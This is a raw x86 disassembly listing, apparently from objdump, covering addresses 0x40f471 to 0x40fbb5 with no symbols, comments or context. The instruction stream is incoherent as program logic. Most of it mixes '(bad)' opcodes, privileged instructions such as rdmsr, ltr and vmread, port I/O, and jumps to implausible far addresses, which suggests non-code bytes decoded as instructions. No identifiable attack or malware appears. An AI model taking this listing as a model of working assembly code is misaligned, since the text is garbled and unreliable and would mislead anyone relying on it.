  40f471:	ret    
  40f472:	add    BYTE PTR [ebp-0x830075],al
  40f478:	add    BYTE PTR [ebp-0x75],al
  40f47b:	mov    DWORD PTR [ebp+0x8ff0430],ecx
  40f481:	lea    edi,[edi+0x20]
  40f484:	add    bh,bh
  40f486:	mov    edx,DWORD PTR [eax-0x7b]
  40f489:	inc    ebp
  40f48a:	rdpmc  
  40f48c:	jne    0x40f491
  40f48e:	add    BYTE PTR [eax-0x75],dl
  40f491:	inc    ebp
  40f492:	call   0x4040fd9c
  40f497:	add    BYTE PTR [ecx-0xe3d775],cl
  40f49d:	or     BYTE PTR [ebx-0x38ff13ff],0x85
  40f4a4:	ret    
  40f4a5:	inc    DWORD PTR [ebp-0xff0001]
  40f4ab:	add    BYTE PTR [ebp-0x4b],al
  40f4ae:	cmp    edi,0x24
  40f4b1:	(bad)  
  40f4b2:	push   DWORD PTR [eax]
  40f4b4:	add    BYTE PTR [ebp-0x39],dl
  40f4b7:	test   ebx,eax
  40f4b9:	je     0x40f440
  40f4bb:	mov    edi,edi
  40f4bd:	sbb    bh,bh
  40f4bf:	test   DWORD PTR gs:[eax],eax
  40f4c2:	(bad)  
  40f4c3:	js     0x40f4c4
  40f4c5:	add    BYTE PTR [ebx-0x38b21fdd],cl
  40f4cb:	sub    eax,ebx
  40f4cd:	mov    ecx,DWORD PTR [ebx-0x5513e377]
  40f4d3:	add    eax,DWORD PTR [eax]
  40f4d5:	dec    ebp
  40f4d6:	push   eax
  40f4d7:	mov    al,BYTE PTR [ebp+0x1]
  40f4da:	mov    eax,DWORD PTR [ebp-0x68]
  40f4dd:	mov    eax,DWORD PTR [eax]
  40f4df:	cld    
  40f4e0:	(bad)  
  40f4e1:	or     BYTE PTR [eax],ah
  40f4e3:	dec    ebp
  40f4e4:	inc    DWORD PTR [eax+0x4]
  40f4e7:	push   ecx
  40f4e8:	add    BYTE PTR [edx-0x1],dh
  40f4eb:	mov    ecx,DWORD PTR [ecx+0x55cef83c]
  40f4f1:	or     DWORD PTR [ebx-0xfff3800],0x8b5545d6
  40f4fb:	add    ecx,DWORD PTR [ecx-0xf037477]
  40f501:	push   ecx
  40f502:	xor    BYTE PTR [ebx],al
  40f504:	inc    ebp
  40f505:	mov    DWORD PTR [ebx-0x7aaaafe8],ecx
  40f50b:	(bad)  
  40f50c:	push   eax
  40f50e:	inc    DWORD PTR [eax]
  40f510:	inc    ebp
  40f511:	add    BYTE PTR [ebx],dh
  40f513:	add    BYTE PTR [ebx],0x0
  40f516:	mov    DWORD PTR [ebx-0x150007d4],eax
  40f51c:	lea    edx,[ebp-0x6c]
  40f51f:	je     0x40f4a6
  40f521:	(bad)  
  40f522:	dec    DWORD PTR [eax]
  40f524:	call   DWORD PTR [ebp-0x7b]
  40f527:	mov    edi,edi
  40f529:	hlt    
  40f52a:	call   DWORD PTR [ebp-0x75]
  40f52d:	mov    esp,eax
  40f52f:	cwde   
  40f530:	(bad)  
  40f531:	mov    bh,0xc3
  40f533:	mov    DWORD PTR [ebx-0x1100e39c],ecx
  40f539:	add    DWORD PTR [eax],0x450050ff
  40f53f:	mov    DWORD PTR [ebx+0x9598c8],ecx
  40f545:	inc    edi
  40f547:	jmp    DWORD PTR [eax]
  40f549:	jmp    0xcd00:0x650481ff
  40f550:	mov    DWORD PTR [ebx],esi
  40f552:	and    al,0x81
  40f554:	(bad)  
  40f555:	cmp    al,0xff
  40f557:	pushf  
  40f558:	push   DWORD PTR [ebp+0x8]
  40f55b:	mov    eax,eax
  40f55d:	add    esi,DWORD PTR [eax]
  40f55f:	enter  0x3c45,0x83
  40f563:	add    ah,bh
  40f565:	adc    DWORD PTR [ebx+0x768b5055],eax
  40f56b:	add    ecx,DWORD PTR [ebx-0x31ba07cf]
  40f571:	mov    esi,eax
  40f573:	xor    BYTE PTR [ebp+0x45],cl
  40f576:	jmp    0x40f503
  40f578:	mov    ebx,DWORD PTR [eax]
  40f57a:	in     al,dx
  40f57b:	inc    ebp
  40f57c:	or     al,0x2
  40f57e:	dec    DWORD PTR [ebp-0x4]
  40f581:	jne    0x40f5d8
  40f583:	mov    ecx,DWORD PTR [eax+0x18558be8]
  40f589:	mov    edi,DWORD PTR [ebx]
  40f58b:	lock push eax
  40f58d:	xchg   ecx,eax
  40f58e:	jmp    0x3414393
  40f593:	adc    al,0x8b
  40f595:	inc    ebp
  40f596:	mov    al,ds:0x8b04008b
  40f59b:	push   ebp
  40f59c:	sub    ecx,DWORD PTR [ecx-0x2d391308]
  40f5a2:	push   ebp
  40f5a3:	test   DWORD PTR [ebx-0x2900d701],ecx
  40f5a9:	inc    ebp
  40f5aa:	dec    ebp
  40f5ab:	mov    DWORD PTR [ecx+0x45ffe424],ecx
  40f5b1:	mov    DWORD PTR [eax],0xe9ff0020
  40f5b7:	add    al,0x0
  40f5b9:	add    BYTE PTR [eax],al
  40f5bb:	mov    eax,edx
  40f5bd:	push   eax
  40f5be:	rol    DWORD PTR [ebp-0xb0077],1
  40f5c4:	bound  eax,QWORD PTR [ebp+0x50]
  40f5c7:	xor    ecx,DWORD PTR [ecx+0x55899803]
  40f5cd:	sub    al,0x89
  40f5cf:	push   esp
  40f5d1:	lea    edx,[ebp-0x6c]
  40f5d4:	jne    0xffd6f4ec
  40f5da:	inc    DWORD PTR [ebp-0x1d0001]
  40f5e0:	jnp    0xc796d5e6
  40f5e6:	mov    eax,ebx
  40f5e8:	fs mov edi,edi
  40f5eb:	sbb    al,0xc1
  40f5ed:	out    dx,al
  40f5ee:	or     al,0x0
  40f5f0:	ret    0x8d50
  40f5f3:	inc    ebp
  40f5f4:	dec    DWORD PTR [ebx+0xfa98d7]
  40f5fa:	test   edi,edi
  40f5fc:	clc    
  40f5fd:	call   FWORD PTR [edi]
  40f5ff:	or     BYTE PTR [eax],cl
  40f601:	inc    ebp
  40f602:	dec    ebp
  40f603:	inc    DWORD PTR [ebx+0x74803114]
  40f609:	add    DWORD PTR [ebx+0x45fc00],ecx
  40f60f:	call   DWORD PTR [eax+edx*1]
  40f612:	add    ecx,DWORD PTR [ebp-0x38]
  40f615:	push   esi
  40f616:	adc    al,0x8
  40f618:	mov    edx,DWORD PTR [ebp-0x14]
  40f61b:	mov    ecx,DWORD PTR [ebp-0x4]
  40f61e:	add    DWORD PTR [ebp-0x68],0xffffff8d
  40f622:	inc    DWORD PTR [esp+esi*8]
  40f625:	inc    ebp
  40f626:	stos   BYTE PTR es:[edi],al
  40f627:	mov    edx,DWORD PTR [ebp+0x1c]
  40f62a:	add    DWORD PTR [ebp-0x10],eax
  40f62d:	mov    edx,DWORD PTR [ebp-0x70]
  40f630:	cmp    eax,DWORD PTR [eax]
  40f632:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f633:	mov    eax,DWORD PTR [eax]
  40f635:	sbb    al,0x73
  40f637:	add    BYTE PTR [ebx],0x1
  40f63a:	call   0x8971463f
  40f63f:	xor    eax,ebp
  40f641:	pop    ds
  40f642:	inc    ebp
  40f643:	xor    al,BYTE PTR [ebp+0x6f760f3a]
  40f649:	(bad)  
  40f64a:	push   DWORD PTR [edi]
  40f64c:	mov    ecx,DWORD PTR [ebx+0x398503f8]
  40f652:	push   DWORD PTR [ebx-0x1]
  40f655:	mov    eax,DWORD PTR [ebp-0x740075]
  40f65b:	sub    eax,DWORD PTR [eax]
  40f65d:	add    eax,DWORD PTR [eax]
  40f65f:	mov    DWORD PTR [ecx+0x5f],eax
  40f662:	mov    DWORD PTR [ebx+0x28],ebx
  40f665:	ret    0xff
  40f668:	mov    ecx,DWORD PTR [ebx+0x1cc783d4]
  40f66e:	ret    
  40f66f:	mov    eax,DWORD PTR [ebp-0x6f0075]
  40f675:	add    BYTE PTR [ebp-0x7d],al
  40f678:	mov    DWORD PTR [eax],eax
  40f67a:	xor    BYTE PTR [edi+edi*8+0x20008d01],al
  40f681:	sar    bh,cl
  40f683:	test   BYTE PTR [eax+0x1],dl
  40f686:	inc    ebp
  40f687:	add    BYTE PTR [ebx],dh
  40f689:	test   BYTE PTR [ebx],0x84
  40f68c:	push   eax
  40f68d:	add    BYTE PTR [ebp+0x0],al
  40f690:	add    eax,0x86
  40f695:	add    BYTE PTR [ebx-0x7f7be340],cl
  40f69b:	add    BYTE PTR [ecx],al
  40f69d:	add    BYTE PTR [eax],al
  40f69f:	mov    esi,0x550030
  40f6a4:	mov    ecx,DWORD PTR [edi]
  40f6a6:	sbb    al,0xda
  40f6a8:	jne    0x40f6aa
  40f6aa:	mov    edi,DWORD PTR [ecx]
  40f6ac:	xor    BYTE PTR [eax+eax*1],0x84
  40f6b0:	add    eax,DWORD PTR [eax]
  40f6b2:	cld    
  40f6b3:	add    BYTE PTR [ebp-0x4f],dh
  40f6b6:	mov    eax,DWORD PTR [ecx]
  40f6b8:	cld    
  40f6b9:	add    BYTE PTR [ecx-0x1bff009b],cl
  40f6bf:	retf   0xe45
  40f6c2:	add    eax,edx
  40f6c4:	sbb    al,0xb7
  40f6c6:	dec    ebp
  40f6c7:	or     al,0x89
  40f6c9:	dec    ebp
  40f6ca:	sbb    al,0xf
  40f6cc:	inc    ebp
  40f6cd:	dec    eax
  40f6ce:	mov    eax,DWORD PTR [ebx]
  40f6d0:	sbb    al,0xf
  40f6d2:	nop
  40f6d3:	scas   al,BYTE PTR es:[edi]
  40f6d4:	add    DWORD PTR [eax],eax
  40f6d6:	add    BYTE PTR [ebp-0x7674ebbb],cl
  40f6dc:	mov    eax,gs
  40f6de:	add    bh,bh
  40f6e0:	mov    edi,edi
  40f6e2:	cmp    DWORD PTR [edi+0x72],edx
  40f6e5:	xor    DWORD PTR [ebx-0x74ee7481],ecx
  40f6eb:	gs cmp al,0x0
  40f6ee:	je     0x40f6c6
  40f6f0:	push   eax
  40f6f1:	sar    BYTE PTR [eax],1
  40f6f3:	mov    bh,0x3e
  40f6f5:	push   cs
  40f6f6:	cmp    DWORD PTR [edi-0x4cff3f4],esi
  40f6fc:	add    DWORD PTR [ecx+0x12],ebp
  40f6ff:	dec    edx
  40f700:	(bad)  
  40f701:	mov    eax,edx
  40f703:	in     al,dx
  40f704:	adc    DWORD PTR [ecx],esi
  40f706:	pop    esi
  40f707:	inc    ecx
  40f708:	leave  
  40f709:	or     DWORD PTR [eax],ebx
  40f70b:	gs push ebp
  40f70d:	add    ah,ch
  40f70f:	into   
  40f710:	in     al,dx
  40f711:	enter  0xb756,0xf0
  40f715:	push   cs
  40f716:	xor    DWORD PTR [edi-0x4fff3ff],0x790f2b38
  40f720:	or     cl,BYTE PTR [ecx+0x7d85fc00]
  40f726:	jnp    0x74417c2e
  40f72c:	test   DWORD PTR [ebx+0x1cfae40f],ecx
  40f732:	add    BYTE PTR [edi],cl
  40f734:	mov    edi,DWORD PTR [ecx-0x78]
  40f737:	ltr    WORD PTR [ecx-0x7b]
  40f73b:	dec    DWORD PTR [edi]
  40f73d:	clc    
  40f73e:	out    0x45,eax
  40f740:	add    BYTE PTR [eax],cl
  40f742:	cmp    ebx,0xffffff8c
  40f745:	jge    0x40f747
  40f747:	jb     0x40f759
  40f749:	je     0x4ff7c9
  40f74f:	pop    edx
  40f750:	push   esi
  40f751:	mov    ecx,DWORD PTR [edi]
  40f753:	in     al,dx
  40f754:	rol    DWORD PTR [ebp+0x0],1
  40f757:	or     DWORD PTR [ebx+0xfb8c08],0x4d
  40f75e:	cmp    DWORD PTR [ecx],0xfffffff0
  40f761:	hlt    
  40f762:	mov    esp,DWORD PTR [eax+0xf034d2b]
  40f768:	(bad)  
  40f76a:	push   eax
  40f76b:	jns    0xb840dbe9
  40f771:	lock push cs
  40f773:	ror    edx,0x3
  40f776:	test   BYTE PTR [ecx+0x5500e800],cl
  40f77c:	dec    eax
  40f77d:	rcpps  xmm4,XMMWORD PTR [ecx+0x4d]
  40f781:	(bad)  
  40f782:	mov    esi,0x7f33ff5f
  40f787:	inc    eax
  40f788:	test   DWORD PTR [edx],eax
  40f78a:	je     0x40f74c
  40f78c:	mov    ecx,ecx
  40f78e:	adc    DWORD PTR [ebp-0xc],0xffffffec
  40f792:	and    eax,DWORD PTR [eax+0xf0103]
  40f798:	jp     0x40f786
  40f79a:	rcpps  xmm3,XMMWORD PTR [edx-0x25]
  40f79e:	add    edx,DWORD PTR [edi+0x74]
  40f7a1:	sbb    BYTE PTR [ebp+0x4d001484],cl
  40f7a7:	add    BYTE PTR [ebp-0x74c48bbb],al
  40f7ad:	je     0x40f732
  40f7af:	cmp    eax,edi
  40f7b1:	js     0x40f7d6
  40f7b3:	add    eax,0xeb0fc003
  40f7b8:	jns    0x40f745
  40f7ba:	vmread DWORD PTR [ecx+0x45],ebx
  40f7be:	add    ecx,DWORD PTR [ebx+0x508d1c74]
  40f7c4:	adc    al,0x8b
  40f7c6:	jge    0x40f7dc
  40f7c8:	mov    edi,DWORD PTR [eax-0x4]
  40f7cb:	add    edi,DWORD PTR [edi]
  40f7cd:	or     bh,bh
  40f7cf:	push   ebp
  40f7d0:	push   es
  40f7d1:	mov    DWORD PTR [ebp-0x4],ebx
  40f7d4:	add    edi,esi
  40f7d6:	pop    es
  40f7d7:	add    esi,DWORD PTR [edi-0x48ccf183]
  40f7dd:	mov    DWORD PTR [esp+esi*8],ecx
  40f7e0:	inc    ebp
  40f7e1:	pop    ebp
  40f7e2:	xor    DWORD PTR [esi-0x4],0x3b
  40f7e6:	add    edx,DWORD PTR [ecx+edi*1]
  40f7e9:	push   es
  40f7ea:	clc    
  40f7eb:	mov    bh,0xdb
  40f7ed:	jp     0x40f7a6
  40f7ef:	add    cl,BYTE PTR [esi]
  40f7f1:	div    DWORD PTR [edi+0x4d8b0c1c]
  40f7f7:	test   edi,edi
  40f7f9:	je     0x40f7ef
  40f7fb:	mov    eax,ecx
  40f7fd:	or     BYTE PTR [ebx],al
  40f7ff:	dec    BYTE PTR [ecx+0x7d3bec7d]
  40f805:	jbe    0x40f879
  40f807:	mov    ecx,DWORD PTR [ebx-0x488017f4]
  40f80d:	add    ecx,DWORD PTR [esi]
  40f80f:	cmp    DWORD PTR [edi+0x45fe0cf8],esi
  40f815:	add    eax,DWORD PTR [ebx-0x287af783]
  40f81b:	je     0x40f86a
  40f81d:	mov    DWORD PTR [ecx],edi
  40f81f:	mov    esi,eax
  40f821:	hlt    
  40f822:	or     BYTE PTR [ecx+0x7dfff4ff],0x5b
  40f829:	jb     0x40f7eb
  40f82b:	jmp    0x40f818
  40f82d:	xor    esi,DWORD PTR [ebx]
  40f82f:	pop    edi
  40f830:	pop    esi
  40f831:	pop    ebx
  40f832:	ret    
  40f833:	ret    0x8b
  40f836:	mov    ecx,DWORD PTR [ebx+0x2c008390]
  40f83c:	xor    DWORD PTR [ecx],0xc
  40f83f:	pushf  
  40f840:	xor    ecx,DWORD PTR [ecx+0x4539fc56]
  40f846:	rdmsr  
  40f848:	test   DWORD PTR [eax+eax*1+0xcfc8b8b],ebx
  40f84f:	dec    ebp
  40f850:	ret    
  40f851:	mov    edi,DWORD PTR [esi-0x4]
  40f854:	pop    eax
  40f855:	dec    ebp
  40f856:	jne    0x40f7e3
  40f858:	xor    edi,esp
  40f85a:	inc    eax
  40f85b:	dec    ebp
  40f85c:	jbe    0x40f8b1
  40f85e:	inc    eax
  40f85f:	pop    ebp
  40f860:	add    edx,DWORD PTR [esi+0x8]
  40f863:	push   esp
  40f864:	dec    eax
  40f865:	push   ecx
  40f866:	mov    eax,edi
  40f868:	and    al,0xf0
  40f86a:	jo     0x40f857
  40f86c:	mov    eax,DWORD PTR [ebx]
  40f86e:	sbb    BYTE PTR [ebp+0x4d],cl
  40f871:	mov    eax,DWORD PTR [ebx]
  40f873:	nop
  40f874:	or     BYTE PTR [eax],al
  40f876:	jne    0x40f8cf
  40f878:	cmp    ebx,DWORD PTR [ebx+0x33893277]
  40f87e:	cld    
  40f87f:	xor    edi,edi
  40f881:	add    edi,DWORD PTR [ebp+0x3]
  40f884:	cmp    DWORD PTR [ecx+0xbcfe8fc],ecx
  40f88a:	js     0x40f810
  40f88c:	jae    0x40f890
  40f88e:	(bad)  
  40f890:	xor    al,0x5d
  40f892:	jmp    0x40f81f
  40f894:	mov    ecx,DWORD PTR [ecx*4+0x33dfb1de]
  40f89b:	fdecstp 
  40f89d:	test   BYTE PTR [edi],ah
  40f89f:	add    bh,BYTE PTR [ebp+0x0]
  40f8a2:	add    ebx,DWORD PTR [ebp-0x77]
  40f8a5:	mov    edi,eax
  40f8a7:	cmp    al,0x0
  40f8aa:	adc    dh,BYTE PTR [ebx]
  40f8ac:	jge    0x40f8b1
  40f8ae:	mov    edi,DWORD PTR [ebx]
  40f8b0:	jl     0x40f8c1
  40f8b2:	clc    
  40f8b3:	dec    edi
  40f8b4:	jge    0x40f8b6
  40f8b6:	mov    eax,DWORD PTR [ebx]
  40f8b8:	jb     0x40f8c2
  40f8ba:	mov    ecx,DWORD PTR [ebp-0x8]
  40f8bd:	mov    edi,edi
  40f8bf:	xor    edx,DWORD PTR [eax]
  40f8c1:	add    edi,DWORD PTR [ebx]
  40f8c3:	mov    DWORD PTR [ebp-0x10],edi
  40f8c6:	inc    edi
  40f8c7:	pop    ebp
  40f8c8:	jge    0x40f905
  40f8ca:	cmp    esi,DWORD PTR [esp+edi*8-0x75]
  40f8ce:	mov    edx,0xc05d87f0
  40f8d3:	imul   ebx,DWORD PTR [esi+0x14],0xffffffc9
  40f8d7:	fimul  WORD PTR [eax]
  40f8d9:	fist   WORD PTR [ebp+0x1c]
  40f8dc:	in     al,dx
  40f8dd:	jne    0x40f8cb
  40f8df:	mov    edi,DWORD PTR [edx-0x7a27a10]
  40f8e5:	imul   edx,DWORD PTR [ebp+0x14],0xffffffc7
  40f8e9:	fdivp  st(0),st
  40f8eb:	fild   WORD PTR [ebp+0x4510f85c]
  40f8f1:	test   BYTE PTR [ebx+0x4d00fc02],cl
  40f8f7:	inc    ebp
  40f8f8:	mov    ecx,DWORD PTR [ebx+0x454dfcfc]
  40f8fe:	mov    ebp,DWORD PTR [ebx-0x4]
  40f901:	adc    al,0x8b
  40f903:	rcl    DWORD PTR [eax],0x48
  40f906:	mov    esi,0x7080803
  40f90b:	fiadd  WORD PTR [ebp+0x4d]
  40f90e:	(bad)  
  40f90f:	mov    edx,DWORD PTR [edx-0x4]
  40f912:	mov    edx,DWORD PTR [ebp-0x4]
  40f915:	xor    ebx,DWORD PTR [ebx+0x330103]
  40f91b:	mov    DWORD PTR [edi+0x872dc],edi
  40f921:	xlat   BYTE PTR ds:[ebx]
  40f922:	into   
  40f923:	ffreep st(6)
  40f925:	retf   0x6c7
  40f928:	iret   
  40f929:	dec    ebp
  40f92a:	inc    ebp
  40f92b:	mov    DWORD PTR [ebx],edi
  40f92d:	fmul   QWORD PTR [edi]
  40f92f:	dec    ebp
  40f930:	jnp    0x40f965
  40f932:	add    BYTE PTR [ebx],al
  40f934:	mov    ecx,DWORD PTR [esp+edi*8]
  40f937:	inc    ebp
  40f938:	dec    ebp
  40f939:	lea    esi,[ebx]
  40f93b:	add    DWORD PTR [ebx],eax
  40f93d:	jb     0x40f97a
  40f93f:	add    BYTE PTR [edi],cl
  40f941:	inc    ebp
  40f942:	imul   eax,edi,0x858bd800
  40f948:	cld    
  40f949:	clc    
  40f94a:	mov    DWORD PTR [ebp+0x0],eax
  40f94d:	inc    DWORD PTR [eax]
  40f94f:	or     al,0xde
  40f951:	sbb    bh,0x1
  40f954:	retf   
  40f955:	add    BYTE PTR [eax+edx*1+0x33004d02],al
  40f95c:	dec    ebp
  40f95d:	add    ecx,DWORD PTR [ecx-0x250b2b77]
  40f963:	enter  0x12de,0xdf
  40f967:	inc    ebp
  40f968:	pop    ebp
  40f969:	dec    DWORD PTR [ebx-0x257f0ff4]
  40f96f:	add    DWORD PTR [edx],edx
  40f971:	add    BYTE PTR [ebp+0x50],dl
  40f974:	mov    ecx,DWORD PTR [ecx+0x45d2f4fc]
  40f97a:	xor    ecx,DWORD PTR [edx-0x38c699fd]
  40f980:	or     ah,al
  40f982:	pop    ss
  40f983:	cdq    
  40f984:	push   ebp
  40f985:	clc    
  40f986:	mov    eax,DWORD PTR [ebp-0x4]
  40f989:	xor    edx,edx
  40f98b:	add    esi,DWORD PTR [ebx]
  40f98d:	cmp    eax,DWORD PTR [ebx]
  40f98f:	hlt    
  40f990:	cmp    DWORD PTR [ebx],esp
  40f992:	or     al,BYTE PTR [ebp+0xf]
  40f995:	mov    eax,DWORD PTR [edx]
  40f997:	loopne 0x40f999
  40f999:	(bad)  
  40f99a:	mov    ecx,esi
  40f99c:	cld    
  40f99d:	pushf  
  40f99e:	pop    ebp
  40f99f:	fwait
  40f9a0:	mov    esi,DWORD PTR [edx]
  40f9a2:	lock mov eax,eax
  40f9a5:	adc    BYTE PTR [ebx],al
  40f9a7:	or     BYTE PTR [ebx+0x4d001001],0xcf
  40f9ae:	xor    ebp,DWORD PTR [edi+0x50e45189]
  40f9b4:	dec    ebp
  40f9b5:	mov    ecx,DWORD PTR [ebx-0x31390304]
  40f9bb:	(bad)  
  40f9bc:	iret   
  40f9bd:	inc    ebp
  40f9be:	(bad)  
  40f9bf:	jne    0x40fa0e
  40f9c1:	mov    ecx,DWORD PTR [ebx+0x3c603d8]
  40f9c7:	(bad)  
  40f9c8:	cmp    ebx,eax
  40f9ca:	je     0x40f952
  40f9cc:	add    edi,edi
  40f9ce:	or     bh,bh
  40f9d0:	dec    ebp
  40f9d1:	inc    ebp
  40f9d2:	mov    esi,DWORD PTR [ebx]
  40f9d4:	cld    
  40f9d5:	add    ecx,esi
  40f9d7:	cmp    ecx,DWORD PTR [eax-0xc]
  40f9da:	mov    edx,DWORD PTR [edi]
  40f9dc:	or     BYTE PTR [ebp-0x7c],al
  40f9df:	mov    ebx,DWORD PTR [ebx-0x7639cd18]
  40f9e5:	test   BYTE PTR [ebx+ebx*4],cl
  40f9e8:	inc    ebp
  40f9e9:	xor    bh,BYTE PTR [esi]
  40f9eb:	mov    DWORD PTR [eax+ebp*8+0x10ef8b],ebx
  40f9f2:	jne    0x40f9bb
  40f9f4:	mov    ebp,esp
  40f9f6:	fcomp  DWORD PTR [ebx]
  40f9f8:	add    BYTE PTR [ecx],al
  40f9fa:	inc    DWORD PTR [ebp-0x75]
  40f9fd:	(bad)  
  40f9fe:	cld    
  40f9ff:	add    al,0xce
  40fa01:	mov    ecx,edi
  40fa03:	cld    
  40fa04:	inc    ebp
  40fa05:	fidivr WORD PTR [ebx]
  40fa07:	fbstp  TBYTE PTR [ebp-0x3e]
  40fa0a:	mov    eax,DWORD PTR [eax]
  40fa0c:	adc    BYTE PTR [ebx-0x3974038b],cl
  40fa12:	fadd   st,st(7)
  40fa14:	add    BYTE PTR [ebp-0x1],al
  40fa17:	mov    ecx,DWORD PTR [esp+edi*8]
  40fa1a:	inc    ebp
  40fa1b:	mov    bh,0xc7
  40fa1e:	loopne 0x40fa65
  40fa20:	sbb    ecx,DWORD PTR [ebx+0x4545fc7f]
  40fa26:	sbb    dh,BYTE PTR [ebx]
  40fa28:	pushf  
  40fa29:	add    ecx,DWORD PTR [ebx-0x398b03c5]
  40fa2f:	mov    eax,edi
  40fa31:	cwde   
  40fa32:	inc    ebp
  40fa33:	inc    ebp
  40fa34:	jne    0x40f9c1
  40fa36:	mov    esp,esp
  40fa38:	clc    
  40fa39:	add    al,0x4d
  40fa3b:	mov    DWORD PTR [ebx],esi
  40fa3d:	or     al,0x33
  40fa3f:	inc    ebp
  40fa40:	lea    ecx,[ebx-0x398d13fd]
  40fa46:	add    bh,al
  40fa48:	inc    ebp
  40fa49:	ror    DWORD PTR [ebx+0x45d829],0x8b
  40fa50:	add    ebp,esp
  40fa52:	shufps xmm1,xmm3,0xc7
  40fa56:	(bad)  
  40fa57:	jmp    0x74863580
  40fa5c:	xor    ecx,DWORD PTR [ebx+0x453bec03]
  40fa62:	hlt    
  40fa63:	mov    ecx,DWORD PTR [edi]
  40fa65:	fadd   DWORD PTR [ebp+0x0]
  40fa68:	xor    ecx,DWORD PTR [edi]
  40fa6a:	add    ecx,ecx
  40fa6c:	cmp    edi,edi
  40fa6e:	pmuludq mm7,QWORD PTR [edx+0x50]
  40fa72:	(bad)  
  40fa73:	jmp    0x40fa00
  40fa75:	mov    edi,esp
  40fa77:	or     al,0xc6
  40fa79:	inc    ebp
  40fa7a:	(bad)  
  40fa7b:	mov    eax,DWORD PTR [ebp+0x10]
  40fa7e:	jne    0x40fa09
  40fa80:	mov    eax,DWORD PTR [ecx]
  40fa82:	clc    
  40fa83:	add    BYTE PTR [ebp-0x40],cl
  40fa86:	xor    edx,DWORD PTR [eax-0x73]
  40fa89:	jne    0x40fa8c
  40fa8b:	push   DWORD PTR [edx+0x8]
  40fa8e:	add    BYTE PTR [ebp+0x45],al
  40fa91:	mov    ebp,ecx
  40fa93:	cld    
  40fa94:	add    BYTE PTR [ebp+0x0],cl
  40fa97:	xor    eax,DWORD PTR [ebp+0x3]
  40fa9a:	mov    DWORD PTR [ebx],edi
  40fa9c:	adc    cl,BYTE PTR [ebx+0x110cf8c7]
  40faa2:	sub    eax,0x5d330e4d
  40faa7:	lea    esi,[ebx]
  40faa9:	add    DWORD PTR [ebx],eax
  40faab:	jb     0x40fa96
  40faad:	add    BYTE PTR [eax],al
  40faaf:	inc    ebp
  40fab0:	add    bl,ch
  40fab2:	inc    ebp
  40fab3:	mov    esi,DWORD PTR [ebx]
  40fab5:	or     al,0x3
  40fab7:	(bad)  
  40fab8:	mov    edi,eax
  40faba:	in     al,dx
  40fabb:	scas   eax,DWORD PTR es:[edi]
  40fabc:	inc    ebp
  40fabd:	mov    esi,DWORD PTR [ebx]
  40fabf:	in     al,0x3
  40fac1:	add    al,0x89
  40fac3:	mov    ecx,DWORD PTR [eax+edi*8]
  40fac6:	dec    ebp
  40fac7:	(bad)  
  40fac8:	mov    ebx,DWORD PTR [esp+ebx*8-0x30cd3165]
  40facf:	mov    ecx,eax
  40fad1:	cld    
  40fad2:	push   es
  40fad3:	dec    ebp
  40fad4:	add    al,0x33
  40fad6:	mov    DWORD PTR [ebx],eax
  40fad8:	in     al,dx
  40fad9:	cmp    DWORD PTR [ebp-0x67],eax
  40fadc:	mov    eax,DWORD PTR [ebp-0xba0068]
  40fae2:	mov    edx,DWORD PTR [ebp-0x4]
  40fae5:	mov    ecx,DWORD PTR [ebp-0x2c]
  40fae8:	xor    eax,DWORD PTR [ebp+0x3]
  40faeb:	cmp    DWORD PTR [ebx],0x8b32749a
  40faf1:	xor    edi,esp
  40faf3:	jmp    0xff74f845
  40faf8:	add    ecx,DWORD PTR [ebp-0x3f]
  40fafb:	xor    ebx,DWORD PTR [edi]
  40fafd:	add    eax,ecx
  40faff:	cmp    ebx,DWORD PTR [eax]
  40fb01:	mov    ecx,DWORD PTR [ebp-0x4]
  40fb04:	mov    ecx,DWORD PTR [eax]
  40fb06:	adc    BYTE PTR [ebp-0x80],al
  40fb09:	jmp    0x40fb0c
  40fb0b:	mov    eax,DWORD PTR [eax]
  40fb0d:	cld    
  40fb0e:	mov    bh,0xc6
  40fb10:	push   ecx
  40fb11:	(bad)  
  40fb12:	jne    0x40fb72
  40fb14:	dec    ecx
  40fb16:	or     BYTE PTR [ecx+ebx*1],cl
  40fb19:	push   ebp
  40fb1a:	inc    ebp
  40fb1b:	in     al,dx
  40fb1c:	add    ebp,esp
  40fb1e:	or     bh,al
  40fb20:	dec    ebp
  40fb21:	cld    
  40fb22:	mov    eax,DWORD PTR [ebp+0x4500f8d8]
  40fb28:	xor    DWORD PTR [edx],0x2
  40fb2b:	pushf  
  40fb2c:	dec    DWORD PTR [ebx+0x45510cf4]
  40fb32:	mov    DWORD PTR [ebx+0x5445fc0c],ecx
  40fb38:	mov    edx,DWORD PTR [ecx+0xc]
  40fb3b:	xor    eax,esi
  40fb3d:	mov    edx,0xc172c7
  40fb42:	inc    ebp
  40fb43:	mov    esi,DWORD PTR [ebp+0x8]
  40fb46:	mov    eax,edx
  40fb48:	call   0x84c5c23d
  40fb4d:	add    DWORD PTR [ebx-0x76bace00],ebx
  40fb53:	mov    ebp,eax
  40fb55:	or     BYTE PTR [eax],dl
  40fb57:	jo     0x40fba6
  40fb59:	push   edi
  40fb5a:	xor    esi,DWORD PTR [ebp+0x3]
  40fb5d:	(bad)  
  40fb5e:	pmulhuw mm0,mm1
  40fb61:	test   DWORD PTR [ebp-0x8],ecx
  40fb64:	mov    DWORD PTR [ebp-0x67],eax
  40fb67:	mov    eax,DWORD PTR [ebp-0x4]
  40fb6a:	xor    edi,DWORD PTR [ebp-0x73]
  40fb6d:	xor    eax,DWORD PTR [ebx]
  40fb6f:	xor    esi,DWORD PTR [edx+0x3]
  40fb72:	add    BYTE PTR [ecx],bh
  40fb74:	inc    ebp
  40fb75:	(bad)  
  40fb76:	mov    edx,DWORD PTR [ebp-0x7b39fe1c]
  40fb7c:	mov    DWORD PTR [eax],0x750f0004
  40fb82:	sub    ecx,DWORD PTR [ebx-0x7974f701]
  40fb88:	lock add BYTE PTR [ebp+0x0],cl
  40fb8c:	mov    esi,DWORD PTR [ebp-0x18]
  40fb8f:	mov    ebp,edx
  40fb91:	or     al,0x72
  40fb93:	ja     0x40fb95
  40fb95:	mov    edx,esi
  40fb97:	cld    
  40fb98:	(bad)  
  40fb9b:	cli    
  40fb9c:	mov    esi,DWORD PTR [ebp-0x4]
  40fb9f:	cmp    ecx,esi
  40fba1:	bswap  edi
  40fba3:	(bad)
  40fba7:	mov    esi,DWORD PTR [ebp-0x4]
  40fbaa:	mov    esi,ecx
  40fbac:	clc    
  40fbad:	repnz add esi,DWORD PTR [ebp+0x45]
  40fbb1:	push   ebx
  40fbb2:	xor    eax,DWORD PTR [ebp+0x3]
  40fbb5:	cmp    al,0x5f
